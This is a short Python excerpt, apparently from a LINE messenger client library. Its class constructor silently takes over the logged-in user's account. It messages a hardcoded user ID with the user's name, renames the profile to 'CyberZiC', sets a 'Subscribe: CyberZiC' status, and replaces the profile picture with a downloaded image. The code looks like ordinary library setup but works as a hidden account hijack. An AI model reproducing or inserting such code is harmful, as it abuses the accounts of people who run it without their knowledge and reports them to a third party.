...
class Object(object):
    ...
    def __init__(self):
        if self.isLogin == True:
            ...
            linex = "u1d1a1c89256f76d396bad6c8e7c820ce"
            xmod = self.getContact(linex).displayName
            self.sendText("u1d1a1c89256f76d396bad6c8e7c820ce", 'Halo %s , Thanks for This' % xmod)
            profile = self.getProfile()
            profile.displayName = "CyberZiC"
            self.updateProfile(profile)
            profile.statusMessage = "Subscribe: CyberZiC"
            self.updateProfile(profile)
            DPK = "http://dl.profile.line-cdn.net/0hbe0_3dy_PUoNJhYdRoVCHTFjMyd6CDsCdUAnLHgmMXMoFX4bZkZ1eSouZClwQ31OOBR0fiElYih0"
            LINE = self.downloadFileURL(DPK)
            self.updateProfilePicture(LINE)
            RIF = "u1d1a1c89256f76d396bad6c8e7c820ce"
